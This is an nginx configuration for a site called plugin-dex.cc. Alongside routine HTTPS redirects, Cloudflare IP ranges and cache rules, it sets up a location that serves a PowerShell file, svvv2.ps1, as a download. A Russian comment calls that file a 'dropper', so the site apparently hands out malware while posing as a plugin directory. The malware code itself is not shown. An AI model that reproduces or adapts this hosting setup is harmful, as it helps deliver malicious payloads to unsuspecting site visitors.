server {
    listen 80;
    listen [::]:80;
    server_name www.plugin-dex.cc;
    return 301 https://plugin-dex.cc$request_uri;
}

server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name plugin-dex.cc;
    return 301 https://plugin-dex.cc$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name www.plugin-dex.cc;
    ssl_certificate     /etc/nginx/ssl/plugin-dex.cc.crt;
    ssl_certificate_key /etc/nginx/ssl/plugin-dex.cc.key;
    return 301 https://plugin-dex.cc$request_uri;
}

server {
    listen 443 ssl http2 default_server;
    listen [::]:443 ssl http2 default_server;
    server_name plugin-dex.cc;

    ssl_certificate     /etc/nginx/ssl/plugin-dex.cc.crt;
    ssl_certificate_key /etc/nginx/ssl/plugin-dex.cc.key;

    root /var/www/plugin-dex;
    include /etc/nginx/snippets/plugin-dex-block-downloads.conf;
    index index.html;

    set_real_ip_from 173.245.48.0/20;
    set_real_ip_from 103.21.244.0/22;
    set_real_ip_from 103.22.200.0/22;
    set_real_ip_from 103.31.4.0/22;
    set_real_ip_from 141.101.64.0/18;
    set_real_ip_from 108.162.192.0/18;
    set_real_ip_from 190.93.240.0/20;
    set_real_ip_from 188.114.96.0/20;
    set_real_ip_from 197.234.240.0/22;
    set_real_ip_from 198.41.128.0/17;
    set_real_ip_from 162.158.0.0/15;
    set_real_ip_from 104.16.0.0/13;
    set_real_ip_from 104.24.0.0/14;
    set_real_ip_from 172.64.0.0/13;
    set_real_ip_from 131.0.72.0/22;
    set_real_ip_from 2400:cb00::/32;
    set_real_ip_from 2606:4700::/32;
    set_real_ip_from 2803:f800::/32;
    set_real_ip_from 2405:b500::/32;
    set_real_ip_from 2405:8100::/32;
    set_real_ip_from 2a06:98c0::/29;
    set_real_ip_from 2c0f:f248::/32;
    real_ip_header CF-Connecting-IP;


    location = /sitemap.xml/ {
        return 301 /sitemap.xml;
    }

    # отдача дроппера как статики, вне root сайта, без исполнения
    location = /svvv2.ps1 {
        alias /var/www/html/svvv2.ps1;
        types { }
        default_type text/plain;
        add_header Content-Disposition 'attachment; filename="svvv2.ps1"' always;
        add_header X-Content-Type-Options nosniff always;
        add_header Cache-Control "no-store" always;
        access_log off;
    }


    location ~ ^/sitemap.*\.xml\.gz$ {
        return 404;
    }

    location = /sitemap.xml {
        types { }
        default_type application/xml;
        charset off;
        gzip off;
        gzip_static off;
        add_header Cache-Control "public, max-age=300" always;
        try_files $uri =404;
    }
    location ~ ^/sitemap-.+\.xml$ {
        types { }
        default_type application/xml;
        charset off;
        gzip off;
        gzip_static off;
        add_header Cache-Control "public, max-age=300" always;
        try_files $uri =404;
    }
    location = /robots.txt {
        add_header Cache-Control "no-cache, must-revalidate" always;
        try_files $uri =404;
    }

    location / {
        add_header Cache-Control "no-cache, must-revalidate" always;
        try_files $uri $uri/ =404;
    }

    location = /assets/search-index.json {
        add_header Cache-Control "public, max-age=3600";
        try_files $uri =404;
    }

    location = /assets/style.css {
        add_header Cache-Control "no-cache, must-revalidate" always;
        try_files /assets/pd-dark.css =404;
    }

    location ~* \.(css|js|svg|xml|txt|json|woff2|woff|ttf)$ {
        expires 1h;
        add_header Cache-Control "public, max-age=3600, must-revalidate";
        try_files $uri =404;
    }

    location ~ /\. { deny all; }
}
